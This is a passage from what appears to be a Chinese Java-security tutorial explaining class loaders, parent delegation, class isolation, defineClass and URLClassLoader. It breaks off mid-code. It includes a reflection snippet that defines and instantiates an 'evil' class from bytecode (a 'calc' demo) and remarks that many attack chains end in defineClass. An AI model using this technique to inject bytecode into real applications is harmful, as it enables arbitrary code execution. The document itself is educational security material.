<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> MyClass.class.getClassLoader();</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 Java 中我们不能直接获取引导类加载器的引用，因为它是由 JVM 本身实现的，且不是 <code>ClassLoader</code> 类的子类。</p>
<p>例如如果我们使用 <code>Class.getClassLoader()</code> 方法来获取 <code>String</code> 类的类加载器，它会返回 <code>null</code>，因为 <code>String</code> 类是由引导类加载器加载的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">bootstrapClassLoader</span> <span class="operator">=</span> String.class.getClassLoader();</span><br><span class="line">System.out.println(bootstrapClassLoader);  <span class="comment">// 输出 null，因为 String 是由引导类加载器加载的</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="获取当前线程的上下文类加载器"><a href="#获取当前线程的上下文类加载器" class="headerlink" title="获取当前线程的上下文类加载器"></a>获取当前线程的上下文类加载器</h4><p>每个 <strong>线程</strong> 都可以绑定一个 <code>ClassLoader</code>，叫做 <strong>上下文类加载器</strong>（Context ClassLoader）。这个类加载器可以通过 <code>Thread.currentThread().getContextClassLoader()</code> 拿到，默认情况下，这个就是 <strong>AppClassLoader</strong>（应用类加载器）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure></div>

<p>上下文类加载器的出现是因为 <strong>双亲委派模型</strong>有个问题：</p>
<ul>
<li>子加载器要委托父加载器先加载类；</li>
<li>但有时候，父加载器（比如 <code>Bootstrap</code>）并不知道子加载器路径下的类。</li>
</ul>
<p>而<strong>线程上下文类加载器</strong>是一个“打破双亲委派”的机制，让<strong>父加载器的代码能反过来加载子加载器的类</strong>。</p>
<p>例如在 <strong>Java 8 及更早</strong>，JDBC API（<code>java.sql.*</code>）存放在 <strong>核心库 <code>rt.jar</code></strong> 中，由 <strong>Bootstrap ClassLoader</strong> 加载；在 **Java 9+**，它被放进了 <strong><code>java.sql</code> 模块</strong>，但依然是由 <strong>Bootstrap ClassLoader</strong> 加载。</p>
<p>而具体的 <strong>JDBC 驱动类</strong>（例如 <code>com.mysql.cj.jdbc.Driver</code>）则通常作为第三方 Jar 包提供，放在应用的 <strong>classpath</strong> 中，由 <strong>AppClassLoader</strong> 加载。</p>
<p>这就带来了一个问题：</p>
<ul>
<li><strong>Bootstrap ClassLoader</strong> 无法直接看到由 <strong>AppClassLoader</strong> 管理的类。</li>
<li>如果 JDBC API（例如 <code>DriverManager</code>）直接用自己的加载器（Bootstrap）去加载驱动类，一定失败。</li>
</ul>
<p>为了解决这个“父加载器看不到子加载器类”的矛盾，JDBC API 采用了 <strong>线程上下文类加载器（Thread Context ClassLoader, TCCL）</strong> 的机制：</p>
<blockquote>
<p>DriverManager 在加载驱动时，不用 Bootstrap 自己，而是调用 <code>Thread.currentThread().getContextClassLoader()</code>。</p>
<p>这样就能让 Bootstrap 级别的 API 间接使用 AppClassLoader 来加载驱动类。</p>
</blockquote>
<h4 id="获取系统类加载器"><a href="#获取系统类加载器" class="headerlink" title="获取系统类加载器"></a>获取系统类加载器</h4><p><strong>系统类加载器</strong>（<code>AppClassLoader</code>）是 JVM 启动时默认用于加载 <strong>应用类路径（classpath）</strong> 下的类的加载器。绝大多数我们自己写的业务代码、以及放在 classpath 中的第三方依赖 jar，都是通过系统类加载器加载的。</p>
<p>系统类加载器可以通过 <code>ClassLoader.getSystemClassLoader()</code> 方法获取：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载器常见方法"><a href="#类加载器常见方法" class="headerlink" title="类加载器常见方法"></a>类加载器常见方法</h3><h4 id="loadClass（加载指定的-Java-类）"><a href="#loadClass（加载指定的-Java-类）" class="headerlink" title="loadClass（加载指定的 Java 类）"></a>loadClass（加载指定的 Java 类）</h4><p><code>loadClass(String name)</code> 是 <code>ClassLoader</code> 类中一个常用的公共方法，用于加载类。它通过类的 <strong>二进制名称</strong>（即类的完全限定名，像 <code>java.lang.String</code>）来加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(name, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该方法首先会委托父类加载器（即父加载器）去加载类，如果父类加载器没有加载到类，它才会使用当前类加载器来加载。</p>
<h4 id="findClass（查找指定的-Java-类）"><a href="#findClass（查找指定的-Java-类）" class="headerlink" title="findClass（查找指定的 Java 类）"></a>findClass（查找指定的 Java 类）</h4><p><code>findClass</code> 是一个 <strong>抽象方法</strong>，通常需要在自定义类加载器中重写。<code>findClass</code> 会被 <code>loadClass</code> 方法调用，用于实际查找和加载类。类加载器不知道如何加载这个类则会抛出 <code>ClassNotFoundException</code> 异常。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException;</span><br></pre></td></tr></table></figure></div>

<h4 id="findLoadedClass（查找-JVM-已经加载过的类）"><a href="#findLoadedClass（查找-JVM-已经加载过的类）" class="headerlink" title="findLoadedClass（查找 JVM 已经加载过的类）"></a>findLoadedClass（查找 JVM 已经加载过的类）</h4><p><code>findLoadedClass</code> 方法用于查找<strong>当前类加载器</strong>是否已经加载了指定的类。如果类已经加载并被缓存，则返回该类的 <code>Class</code> 对象。它是在 <code>loadClass</code> 方法内部调用的，用来避免重复加载已经加载过的类。如果类已经被加载并且缓存，则返回该类的 <code>Class</code> 对象；否则返回 <code>null</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name);</span><br></pre></td></tr></table></figure></div>

<h4 id="resolveClass（链接指定的-Java-类）"><a href="#resolveClass（链接指定的-Java-类）" class="headerlink" title="resolveClass（链接指定的 Java 类）"></a>resolveClass（链接指定的 Java 类）</h4><p><code>resolveClass</code> 方法用于<strong>解析</strong>一个类。类加载器通过此方法将类链接到 JVM 中，并确保该类已经准备好执行。这个方法通常在类被 <code>defineClass</code> 后调用，用于确保类已经完全初始化，并准备好进一步的操作（如方法调用等）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="双亲委派模型（Parent-Delegation-Model）"><a href="#双亲委派模型（Parent-Delegation-Model）" class="headerlink" title="双亲委派模型（Parent Delegation Model）"></a>双亲委派模型（Parent Delegation Model）</h3><p>双亲委派模型（Parent Delegation Model）是 Java 类加载器机制中的一种设计模式。通过这种模型，<strong>类加载器在加载类时，会先将请求委托给父类加载器处理，如果父类加载器无法加载这个类，才由当前类加载器尝试加载</strong>。</p>
<p>这种机制保证了Java核心类库（如 <code>java.lang.*</code>、<code>java.util.*</code> 等）始终由引导类加载器（Bootstrap ClassLoader）加载，从而避免了类的重复加载和冲突，确保了 Java 核心类库的安全性。</p>
<h4 id="类加载器层次结构"><a href="#类加载器层次结构" class="headerlink" title="类加载器层次结构"></a>类加载器层次结构</h4><p>在 Java 中，类加载器采用<strong>双亲委派模型</strong>来加载类。这个模型的层次结构是通过父子关系来表示的，不同层次的类加载器通过 <code>getParent()</code> 方法来连接。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 Java 里谈类加载器的“层次结构”时，往往有两个不同的含义：</p>
<ul>
<li><strong>类的继承结构</strong> ：这是 <strong>Java 类型系统</strong>上的关系，编译时就确定了。这是 <strong>“类继承树”</strong>，描述的是类的实现复用关系。例如：<ul>
<li><code>AppClassLoader extends URLClassLoader extends ClassLoader</code></li>
<li><code>ExtClassLoader</code>（JDK 8）或 <code>PlatformClassLoader</code>（JDK 9+）也都直接 <code>extends ClassLoader</code></li>
<li>所有类加载器最终都继承自 <code>java.lang.ClassLoader</code></li>
</ul>
</li>
<li><strong>父子委派关系</strong> ：这是 <strong>对象运行时的组合关系</strong>，由 <code>ClassLoader</code> 的 <code>parent</code> 字段维护。这是 <strong>“对象委派链”</strong>，决定了类加载请求的传递路径。例如：<ul>
<li><code>AppClassLoader</code> 的 <code>parent</code> &#x3D; <code>ExtClassLoader</code>（JDK 8） &#x2F; <code>PlatformClassLoader</code>（JDK 9+）</li>
<li><code>ExtClassLoader</code> &#x2F; <code>PlatformClassLoader</code> 的 <code>parent</code> &#x3D; <code>Bootstrap</code>（C++ 实现，不暴露，返回 <code>null</code>）</li>
<li><strong>自定义类加载器</strong>如果没指定 <code>parent</code>，默认 <code>parent</code> &#x3D; 系统类加载器（<code>AppClassLoader</code>）</li>
</ul>
</li>
</ul>
<p>而这里我们提到的类的层次结构指的是类加载过程中类的查找相关的层次结构，也就是<strong>类的父子委派关系</strong>，即 <code>ClassLoader</code> 的 <code>parent</code> 字段。</p>

    </div>
  </div>

<p>我们可以通过如下代码验证类加载器的层次结构：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();  <span class="comment">// 默认父加载器是系统类加载器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);  <span class="comment">// 你也可以显式指定父加载器</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 自定义的类加载逻辑</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassLoader</span> <span class="variable">myClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;自定义类加载器: &quot;</span> + myClassLoader);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> myClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;系统类加载器: &quot;</span> + systemClassLoader);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">extClassLoader</span> <span class="operator">=</span> systemClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;扩展类加载器: &quot;</span> + extClassLoader);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">bootstrapClassLoader</span> <span class="operator">=</span> extClassLoader.getParent();</span><br><span class="line">        System.out.println(<span class="string">&quot;启动类加载器: &quot;</span> + bootstrapClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码运行结果如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">自定义类加载器: com.example.MyClassLoader@330bedb4</span><br><span class="line">系统类加载器: sun.misc.Launcher$AppClassLoader@58644d46</span><br><span class="line">扩展类加载器: sun.misc.Launcher$ExtClassLoader@2503dbd3</span><br><span class="line">启动类加载器: null</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>自定义类加载器</strong>默认的父级是 <strong>系统类加载器</strong>。当你创建一个自定义类加载器时，它会继承 <code>AppClassLoader</code> 类，而 <code>ClassLoader</code> 的构造方法会自动指定父加载器。具体来说：</p>
<ul>
<li>如果你没有显式指定父加载器，<code>ClassLoader</code> 的构造函数会将 <strong>系统类加载器</strong>（<code>ClassLoader.getSystemClassLoader()</code>）作为默认的父加载器。</li>
<li>你也可以通过重载构造函数，手动设置父加载器为其他加载器（如启动类加载器或扩展类加载器），但通常情况下，它的父加载器默认是 <strong>系统类加载器</strong>。</li>
</ul>

    </div>
  </div>

<p>因此类加载器的层次结构如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/ParentDelegationModel.svg"
                      alt="ParentDelegationModel"
                ></p>
<h4 id="双亲委派模型具体实现"><a href="#双亲委派模型具体实现" class="headerlink" title="双亲委派模型具体实现"></a>双亲委派模型具体实现</h4><p>在 Java 中，每个类加载器都有一个父类加载器，类加载器在加载类时，遵循以下步骤：</p>
<ol>
<li><strong>检查当前类是否已经加载</strong>：如果已经加载，则直接返回。</li>
<li><strong>委托父类加载器加载</strong>：将加载请求委托给父类加载器，依次递归，直到最顶层的 Bootstrap ClassLoader。</li>
<li><strong>父类加载器无法加载</strong>：如果父类加载器无法加载该类，则当前类加载器尝试自己加载。</li>
</ol>
<p>在 Java 中，类加载器之间的双亲委派模型可以通过 <code>ClassLoader</code> 类的 <code>loadClass</code> 方法来实现。以下是 <code>ClassLoader</code> 类中 <code>loadClass</code> 方法的简化实现：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 检查类是否已经加载</span></span><br><span class="line">    Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 委托父类加载器加载</span></span><br><span class="line">                c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 使用引导类加载器加载</span></span><br><span class="line">                c = findBootstrapClassOrNull(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 父类加载器无法加载时，当前类加载器尝试加载</span></span><br><span class="line">            c = findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">        <span class="comment">// 类加载完成，对加载的类进行链接和初始化</span></span><br><span class="line">        resolveClass(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="类加载器与类的隔离性"><a href="#类加载器与类的隔离性" class="headerlink" title="类加载器与类的隔离性"></a>类加载器与类的隔离性</h3><p> 类加载器与类的隔离性是 Java 设计中的重要特性之一，它使得不同的类加载器能够加载同名的类，而这些类相互独立、互不干扰，从而避免了不同模块或应用之间的类冲突。类加载器与类的隔离性对于实现模块化、插件化以及动态类加载系统非常关键。</p>
<h4 id="类命名空间"><a href="#类命名空间" class="headerlink" title="类命名空间"></a>类命名空间</h4><p>类命名空间（<strong>Class Namespace</strong>）是指类加载器在加载类时为其所分配的一个独立的命名空间。在 Java 中，<strong>每个类加载器都有自己的命名空间</strong>，用来隔离自己加载的类与其他类加载器加载的类。这种隔离机制保证了<strong>即使不同类加载器加载了相同名称的类，它们也可以作为独立的类存在，而互不干扰</strong>。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>不同的类加载器在加载类时依赖于自己的命名空间来确定类是否已经被加载以及加载后的处理。这就是为什么 <code>loadClass</code> 在双亲委派模型中每一级类加载器都要调用 <code>findLoadedClass</code> 来判断类是否已经被加载过了。</p>

    </div>
  </div>

<h4 id="类加载的隔离性"><a href="#类加载的隔离性" class="headerlink" title="类加载的隔离性"></a>类加载的隔离性</h4><p>Java 中的类是通过类加载器加载的。当一个类被类加载器加载时，它会被分配一个 <code>Class</code> 对象，该对象代表了这个类在 JVM 中的唯一身份。对于同一个类，如果通过不同的类加载器加载，它们的 <code>Class</code> 对象是不同的。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">loader2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; class1 = loader1.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line">Class&lt;?&gt; class2 = loader2.loadClass(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(class1 == class2);  <span class="comment">// 输出 false</span></span><br></pre></td></tr></table></figure></div>

<p>这是因为每个类加载器在加载类时，都会在自己的命名空间中维护已加载的类。类加载器的命名空间是独立的，意味着相同的类，如果由不同的类加载器加载，它们将被认为是不同的类，即使它们的字节码完全相同。</p>
<h2 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h2><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是 <code>loadClass</code>、<code>findClass</code>、<code>defineClass</code> 这三个方法调用。其中 <code>defineClass</code> 的作用是将获取到的字节码处理成真正的 Java 类，是类加载中真正核心的部分。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>需要注意：<strong>类的链接（verification、preparation、resolution）不在 <code>defineClass</code> 内完成</strong>，而是在 <code>resolveClass</code> 中进行。</p>

    </div>
  </div>

<p><code>defineClass</code> 将字节数组转换为一个 <code>Class</code> 对象。这个方法是 <code>ClassLoader</code> 的核心，用于将字节码定义为类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len) <span class="keyword">throws</span> ClassFormatError;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong><code>String name</code><strong>：要定义的类的</strong>全限定名称</strong>（例如 <code>com.example.MyClass</code>），它是该类在 JVM 中的名字。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>name</code> 参数必须与字节码中的类名匹配**或者设置为 <code>null</code>**，否则会有如下报错：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.reflect.InvocationTargetException</span><br><span class="line">  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">  at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">  at com.example.Main.main(Main.java:12)</span><br><span class="line">Caused by: java.lang.NoClassDefFoundError: YourNameArgumentInput (wrong name: com/example/MyClass)</span><br><span class="line">  at java.lang.ClassLoader.defineClass1(Native Method)</span><br><span class="line">  at java.lang.ClassLoader.defineClass(ClassLoader.java:760)</span><br><span class="line">  at java.lang.ClassLoader.defineClass(ClassLoader.java:642)</span><br><span class="line">  ... 5 more</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>defineClass</code> 还有一个默认 <code>name</code> 为 <code>null</code> 的封装：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>
</li>
<li><p><strong><code>byte[] b</code></strong> ：包含类的字节码的字节数组。这个字节数组包含了通过编译器或其他方式生成的 Java 字节码，通常是 <code>.class</code> 文件的内容。</p>
</li>
<li><p><strong><code>int off</code></strong> ：字节数组 <code>b</code> 中，字节码数据的起始偏移量。表示从数组 <code>b</code> 的哪个位置开始读取数据。一般情况下，如果整个数组都包含字节码数据，这个值为 <code>0</code>。</p>
</li>
<li><p><strong><code>int len</code></strong> ：要从字节数组 <code>b</code> 中读取的字节码数据的长度。表示从偏移量 <code>off</code> 开始，读取多长的数据来定义类。</p>
</li>
</ul>
<p>Java 默认的 <code>ClassLoader#defineClass</code> 是一个 native 方法，逻辑在 JVM 的 C 代码中。我们可以通过反射调用这个方法把字节码转换为类：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] classByteCode = getEvilClass(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = (Class&lt;?&gt;) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), classByteCode, <span class="number">0</span>, classByteCode.length);</span><br><span class="line">clazz.newInstance();</span><br></pre></td></tr></table></figure></div>

<p>在实际场景中，因为 <code>defineClass</code> 方法作用域是不开放的，所以攻击者很少能直接利用到它，但很多攻击链最终都是通过这个方法加载字节码。</p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code> 是 JDK 提供的通用类加载器实现，能把一组 <code>URL</code>（目录 &#x2F; JAR &#x2F; 远程地址）当作<strong>类与资源的搜索路径</strong>。</p>
<p><strong><code>AppClassLoader</code> 是 <code>URLClassLoader</code> 的子类</strong>（继承意义的“子类”）。也就是说，<code>AppClassLoader</code> 本身就是 <code>URLClassLoader</code> 的一个具体实现。<code>AppClassLoader</code> 默认加载 <code>java.class.path</code> 里的内容，本质上就是把 <code>classpath</code> 转换成一组 <code>URL</code>，然后调用 <code>URLClassLoader</code> 的逻辑。</p>
<p>所以平时我们用 <code>java -cp ...</code> 指定的类路径，都是通过 <code>URLClassLoader</code> 机制来处理的。</p>
<p><code>URLClassLoader</code> 实际上是通过内部的 <code>URLClassPath</code> 组件，为每个 URL 创建不同的资源加载器（实现类为 <code>Loader</code> 抽象类的不同子类）。其中核心逻辑为 <code>sun.misc.URLClassPath.getLoader(URL url)</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 根据给定的 URL，返回一个对应的 Loader 实例</span></span><br><span class="line"><span class="comment"> * Loader 是 URLClassPath 的内部抽象类，负责从某种资源（目录/JAR/远程）中加载 class/资源字节</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Loader <span class="title function_">getLoader</span><span class="params">(<span class="keyword">final</span> URL url)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 在特权上下文中执行，避免 SecurityManager 权限不足的问题</span></span><br><span class="line">        <span class="keyword">return</span> 